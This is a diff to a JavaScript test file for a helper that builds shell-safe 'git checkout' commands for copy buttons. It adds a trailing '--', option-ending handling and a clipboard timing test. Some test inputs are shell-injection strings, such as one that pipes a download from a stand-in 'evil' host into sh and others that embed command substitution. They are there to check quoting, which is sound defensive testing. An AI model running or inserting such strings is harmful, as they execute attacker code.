@@ -43,21 +43,37 @@ const runTimers = timers => {
 };
 
 test('checkoutCommand leaves a plain branch name bare', () => {
-    assert.equal(checkoutCommand('feature/ABC-123-export'), 'git checkout feature/ABC-123-export');
-    assert.equal(checkoutCommand('release_2.1+hotfix@x=y,z%20'), 'git checkout release_2.1+hotfix@x=y,z%20');
+    assert.equal(checkoutCommand('feature/ABC-123-export'), 'git checkout feature/ABC-123-export --');
+    assert.equal(checkoutCommand('release_2.1+hotfix@x=y,z%20'), 'git checkout release_2.1+hotfix@x=y,z%20 --');
 });
 
 test('checkoutCommand puts in single quotes a name the shell would read: $, ;, |, &, a backtick, parentheses, quotes, !, #, braces', () => {
-    assert.equal(checkoutCommand('x;curl${IFS}evil|sh'), "git checkout 'x;curl${IFS}evil|sh'");
-    assert.equal(checkoutCommand('a&b'), "git checkout 'a&b'");
-    assert.equal(checkoutCommand('a`id`'), "git checkout 'a`id`'");
-    assert.equal(checkoutCommand('a$(id)'), "git checkout 'a$(id)'");
-    assert.equal(checkoutCommand('a"b!c#d{e}'), `git checkout 'a"b!c#d{e}'`);
-    assert.equal(checkoutCommand('é'), "git checkout 'é'");
+    assert.equal(checkoutCommand('x;curl${IFS}evil|sh'), "git checkout 'x;curl${IFS}evil|sh' --");
+    assert.equal(checkoutCommand('a&b'), "git checkout 'a&b' --");
+    assert.equal(checkoutCommand('a`id`'), "git checkout 'a`id`' --");
+    assert.equal(checkoutCommand('a$(id)'), "git checkout 'a$(id)' --");
+    assert.equal(checkoutCommand('a"b!c#d{e}'), `git checkout 'a"b!c#d{e}' --`);
+    assert.equal(checkoutCommand('é'), "git checkout 'é' --");
 });
 
 test('checkoutCommand writes a single quote in the name as \'\\\'\'', () => {
-    assert.equal(checkoutCommand("it's"), "git checkout 'it'\\''s'");
+    assert.equal(checkoutCommand("it's"), "git checkout 'it'\\''s' --");
+});
+
+// `git checkout docs`, with origin/docs not fetched yet, restores the folder
+// docs/ from the index, losing its changes; the trailing -- makes the name a
+// branch only: git still creates it from a fetched remote branch, and fails
+// otherwise
+test('checkoutCommand ends with -- so that a branch named like a path is never read as one', () => {
+    assert.equal(checkoutCommand('docs'), 'git checkout docs --');
+});
+
+// refs/heads/-f can be pushed with plain git: `git checkout -f` would throw
+// the uncommitted changes away
+test('checkoutCommand ends the options before a name starting with -, which git would read as an option', () => {
+    assert.equal(checkoutCommand('-f'), 'git checkout --end-of-options -f --');
+    assert.equal(checkoutCommand('--detach'), 'git checkout --end-of-options --detach --');
+    assert.equal(checkoutCommand('-a;b'), "git checkout --end-of-options '-a;b' --");
 });
 
 test('handleCopyClick takes no click outside a copy button and writes nothing', async () => {
@@ -103,6 +119,13 @@ test('handleCopyClick says the clipboard needs https or localhost when the page 
     runTimers(timers);
     assert.ok(!button.classList.contains('copy-failed'));
     assert.equal(button.title, 'Copy: git checkout feat-a');
+});
+
+// Safari keeps the user activation a clipboard write needs during the event only
+test('handleCopyClick writes to the clipboard during the click itself', () => {
+    const { written, options } = fakes();
+    handleCopyClick({ target: copyButton() }, options);
+    assert.deepEqual(written, ['git checkout feat-a']);
 });
 
 test('handleCopyClick gives the reason of a refused write, thrown or rejected', async () => {
